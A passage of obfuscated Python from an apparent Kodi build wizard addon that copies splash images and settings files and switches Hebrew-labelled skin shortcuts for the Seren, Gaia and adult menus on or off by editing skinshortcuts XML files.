	copyfile (OOO0O0O00OOO00O00 ,OO0OO0OO00OOOO000 )#line:533
def skindialogsettind18 ():#line:534
	try :#line:535
		O0OOO00000O000O00 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:536
		O0OOO00000OOOO00O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:537
		copyfile (O0OOO00000O000O00 ,O0OOO00000OOOO00O )#line:538
	except :pass #line:539
def rdon ():#line:540
	loginit .loginIt ('restore','all')#line:541
	O000OOO0O0OO00O00 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:543
	OO000O0O0000000O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:544
	copyfile (O000OOO0O0OO00O00 ,OO000O0O0000000O0 )#line:545
def adults18 ():#line:547
  O0OO0O0OOO000OO0O =(ADDON .getSetting ("adults"))#line:548
  if O0OO0O0OOO000OO0O =='true':#line:549
    OO0O0O00O000OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:550
    with open (OO0O0O00O000OOOO0 ,'r')as OO0OOOOOO00OOOO0O :#line:551
      OOOOOO0000O0OOOO0 =OO0OOOOOO00OOOO0O .read ()#line:552
    OOOOOO0000O0OOOO0 =OOOOOO0000O0OOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:570
    with open (OO0O0O00O000OOOO0 ,'w')as OO0OOOOOO00OOOO0O :#line:573
      OO0OOOOOO00OOOO0O .write (OOOOOO0000O0OOOO0 )#line:574
def rdbuildaddon ():#line:575
  O000O00OO0OOO0O0O =(ADDON .getSetting ("rdbuild"))#line:576
  if O000O00OO0OOO0O0O =='true':#line:577
    OOO0O0OOO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:578
    with open (OOO0O0OOO0000OOOO ,'r')as OO000OOOOOO0000OO :#line:579
      O00O00OOO0OO0OOOO =OO000OOOOOO0000OO .read ()#line:580
    O00O00OOO0OO0OOOO =O00O00OOO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:598
    with open (OOO0O0OOO0000OOOO ,'w')as OO000OOOOOO0000OO :#line:601
      OO000OOOOOO0000OO .write (O00O00OOO0OO0OOOO )#line:602
    OOO0O0OOO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:606
    with open (OOO0O0OOO0000OOOO ,'r')as OO000OOOOOO0000OO :#line:607
      O00O00OOO0OO0OOOO =OO000OOOOOO0000OO .read ()#line:608
    O00O00OOO0OO0OOOO =O00O00OOO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:626
    with open (OOO0O0OOO0000OOOO ,'w')as OO000OOOOOO0000OO :#line:629
      OO000OOOOOO0000OO .write (O00O00OOO0OO0OOOO )#line:630
    OOO0O0OOO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:634
    with open (OOO0O0OOO0000OOOO ,'r')as OO000OOOOOO0000OO :#line:635
      O00O00OOO0OO0OOOO =OO000OOOOOO0000OO .read ()#line:636
    O00O00OOO0OO0OOOO =O00O00OOO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:654
    with open (OOO0O0OOO0000OOOO ,'w')as OO000OOOOOO0000OO :#line:657
      OO000OOOOOO0000OO .write (O00O00OOO0OO0OOOO )#line:658
    OOO0O0OOO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:662
    with open (OOO0O0OOO0000OOOO ,'r')as OO000OOOOOO0000OO :#line:663
      O00O00OOO0OO0OOOO =OO000OOOOOO0000OO .read ()#line:664
    O00O00OOO0OO0OOOO =O00O00OOO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:682
    with open (OOO0O0OOO0000OOOO ,'w')as OO000OOOOOO0000OO :#line:685
      OO000OOOOOO0000OO .write (O00O00OOO0OO0OOOO )#line:686
    OOO0O0OOO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:689
    with open (OOO0O0OOO0000OOOO ,'r')as OO000OOOOOO0000OO :#line:690
      O00O00OOO0OO0OOOO =OO000OOOOOO0000OO .read ()#line:691
    O00O00OOO0OO0OOOO =O00O00OOO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:709
    with open (OOO0O0OOO0000OOOO ,'w')as OO000OOOOOO0000OO :#line:712
      OO000OOOOOO0000OO .write (O00O00OOO0OO0OOOO )#line:713
    OOO0O0OOO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:715
    with open (OOO0O0OOO0000OOOO ,'r')as OO000OOOOOO0000OO :#line:716
      O00O00OOO0OO0OOOO =OO000OOOOOO0000OO .read ()#line:717
    O00O00OOO0OO0OOOO =O00O00OOO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:735
    with open (OOO0O0OOO0000OOOO ,'w')as OO000OOOOOO0000OO :#line:738
      OO000OOOOOO0000OO .write (O00O00OOO0OO0OOOO )#line:739
    OOO0O0OOO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:741
    with open (OOO0O0OOO0000OOOO ,'r')as OO000OOOOOO0000OO :#line:742
      O00O00OOO0OO0OOOO =OO000OOOOOO0000OO .read ()#line:743
    O00O00OOO0OO0OOOO =O00O00OOO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:761
    with open (OOO0O0OOO0000OOOO ,'w')as OO000OOOOOO0000OO :#line:764
      OO000OOOOOO0000OO .write (O00O00OOO0OO0OOOO )#line:765
    OOO0O0OOO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:768
    with open (OOO0O0OOO0000OOOO ,'r')as OO000OOOOOO0000OO :#line:769
      O00O00OOO0OO0OOOO =OO000OOOOOO0000OO .read ()#line:770
    O00O00OOO0OO0OOOO =O00O00OOO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:788
    with open (OOO0O0OOO0000OOOO ,'w')as OO000OOOOOO0000OO :#line:791
      OO000OOOOOO0000OO .write (O00O00OOO0OO0OOOO )#line:792
def rdbuildinstall ():#line:795
  try :#line:796
   O00O00OOO000OO0OO =(ADDON .getSetting ("rdbuild"))#line:797
   if O00O00OOO000OO0OO =='true':#line:798
     O00000O000O00O000 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:799
     O0O00OO0000OO0O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:800
     copyfile (O00000O000O00O000 ,O0O00OO0000OO0O00 )#line:801
  except :#line:802
     pass #line:803
def rdbuildaddonoff ():#line:806
    O0OO00OO0OO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:809
    with open (O0OO00OO0OO000OO0 ,'r')as OO00OOO00000O0O00 :#line:810
      O000OO0O0O000OOOO =OO00OOO00000O0O00 .read ()#line:811
    O000OO0O0O000OOOO =O000OO0O0O000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:829
    with open (O0OO00OO0OO000OO0 ,'w')as OO00OOO00000O0O00 :#line:832
      OO00OOO00000O0O00 .write (O000OO0O0O000OOOO )#line:833
    O0OO00OO0OO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:837
    with open (O0OO00OO0OO000OO0 ,'r')as OO00OOO00000O0O00 :#line:838
      O000OO0O0O000OOOO =OO00OOO00000O0O00 .read ()#line:839
    O000OO0O0O000OOOO =O000OO0O0O000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:857
    with open (O0OO00OO0OO000OO0 ,'w')as OO00OOO00000O0O00 :#line:860
      OO00OOO00000O0O00 .write (O000OO0O0O000OOOO )#line:861
    O0OO00OO0OO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:865
    with open (O0OO00OO0OO000OO0 ,'r')as OO00OOO00000O0O00 :#line:866
      O000OO0O0O000OOOO =OO00OOO00000O0O00 .read ()#line:867
    O000OO0O0O000OOOO =O000OO0O0O000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:885
    with open (O0OO00OO0OO000OO0 ,'w')as OO00OOO00000O0O00 :#line:888
      OO00OOO00000O0O00 .write (O000OO0O0O000OOOO )#line:889
    O0OO00OO0OO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:893
    with open (O0OO00OO0OO000OO0 ,'r')as OO00OOO00000O0O00 :#line:894
      O000OO0O0O000OOOO =OO00OOO00000O0O00 .read ()#line:895
    O000OO0O0O000OOOO =O000OO0O0O000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:913
    with open (O0OO00OO0OO000OO0 ,'w')as OO00OOO00000O0O00 :#line:916
      OO00OOO00000O0O00 .write (O000OO0O0O000OOOO )#line:917
    O0OO00OO0OO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:920
    with open (O0OO00OO0OO000OO0 ,'r')as OO00OOO00000O0O00 :#line:921
      O000OO0O0O000OOOO =OO00OOO00000O0O00 .read ()#line:922
    O000OO0O0O000OOOO =O000OO0O0O000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:940
    with open (O0OO00OO0OO000OO0 ,'w')as OO00OOO00000O0O00 :#line:943
      OO00OOO00000O0O00 .write (O000OO0O0O000OOOO )#line:944
    O0OO00OO0OO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:946
    with open (O0OO00OO0OO000OO0 ,'r')as OO00OOO00000O0O00 :#line:947
      O000OO0O0O000OOOO =OO00OOO00000O0O00 .read ()#line:948
    O000OO0O0O000OOOO =O000OO0O0O000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:966
    with open (O0OO00OO0OO000OO0 ,'w')as OO00OOO00000O0O00 :#line:969
      OO00OOO00000O0O00 .write (O000OO0O0O000OOOO )#line:970
    O0OO00OO0OO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:972
    with open (O0OO00OO0OO000OO0 ,'r')as OO00OOO00000O0O00 :#line:973
      O000OO0O0O000OOOO =OO00OOO00000O0O00 .read ()#line:974
    O000OO0O0O000OOOO =O000OO0O0O000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:992
    with open (O0OO00OO0OO000OO0 ,'w')as OO00OOO00000O0O00 :#line:995
      OO00OOO00000O0O00 .write (O000OO0O0O000OOOO )#line:996
    O0OO00OO0OO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:999
    with open (O0OO00OO0OO000OO0 ,'r')as OO00OOO00000O0O00 :#line:1000
      O000OO0O0O000OOOO =OO00OOO00000O0O00 .read ()#line:1001
    O000OO0O0O000OOOO =O000OO0O0O000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1019
    with open (O0OO00OO0OO000OO0 ,'w')as OO00OOO00000O0O00 :#line:1022
      OO00OOO00000O0O00 .write (O000OO0O0O000OOOO )#line:1023
def rdbuildinstalloff ():#line:1026
    try :#line:1027
       O0000O0OOOO0O0O00 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1028
       OOO00OO0OO00OOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1029
       copyfile (O0000O0OOOO0O0O00 ,OOO00OO0OO00OOOOO )#line:1031
       O0000O0OOOO0O0O00 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1033
       OOO00OO0OO00OOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1034
       copyfile (O0000O0OOOO0O0O00 ,OOO00OO0OO00OOOOO )#line:1036
       O0000O0OOOO0O0O00 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1038
       OOO00OO0OO00OOOOO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1039
       copyfile (O0000O0OOOO0O0O00 ,OOO00OO0OO00OOOOO )#line:1041
       O0000O0OOOO0O0O00 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1044
       OOO00OO0OO00OOOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1045
       copyfile (O0000O0OOOO0O0O00 ,OOO00OO0OO00OOOOO )#line:1047
    except :#line:1049
       pass #line:1050
def rdbuildaddonON ():#line:1057
    OO00O00O00O000O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1059
    with open (OO00O00O00O000O00 ,'r')as OO0OOOO000O000OO0 :#line:1060
      O000O0000OOOO0O0O =OO0OOOO000O000OO0 .read ()#line:1061
    O000O0000OOOO0O0O =O000O0000OOOO0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1079
    with open (OO00O00O00O000O00 ,'w')as OO0OOOO000O000OO0 :#line:1082
      OO0OOOO000O000OO0 .write (O000O0000OOOO0O0O )#line:1083
    OO00O00O00O000O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1087
    with open (OO00O00O00O000O00 ,'r')as OO0OOOO000O000OO0 :#line:1088
      O000O0000OOOO0O0O =OO0OOOO000O000OO0 .read ()#line:1089
    O000O0000OOOO0O0O =O000O0000OOOO0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1107
    with open (OO00O00O00O000O00 ,'w')as OO0OOOO000O000OO0 :#line:1110
      OO0OOOO000O000OO0 .write (O000O0000OOOO0O0O )#line:1111
    OO00O00O00O000O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1115
    with open (OO00O00O00O000O00 ,'r')as OO0OOOO000O000OO0 :#line:1116
      O000O0000OOOO0O0O =OO0OOOO000O000OO0 .read ()#line:1117
    O000O0000OOOO0O0O =O000O0000OOOO0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1135
    with open (OO00O00O00O000O00 ,'w')as OO0OOOO000O000OO0 :#line:1138
      OO0OOOO000O000OO0 .write (O000O0000OOOO0O0O )#line:1139
    OO00O00O00O000O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1143
    with open (OO00O00O00O000O00 ,'r')as OO0OOOO000O000OO0 :#line:1144
      O000O0000OOOO0O0O =OO0OOOO000O000OO0 .read ()#line:1145
    O000O0000OOOO0O0O =O000O0000OOOO0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1163
    with open (OO00O00O00O000O00 ,'w')as OO0OOOO000O000OO0 :#line:1166
      OO0OOOO000O000OO0 .write (O000O0000OOOO0O0O )#line:1167
    OO00O00O00O000O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1170
    with open (OO00O00O00O000O00 ,'r')as OO0OOOO000O000OO0 :#line:1171
      O000O0000OOOO0O0O =OO0OOOO000O000OO0 .read ()#line:1172
    O000O0000OOOO0O0O =O000O0000OOOO0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
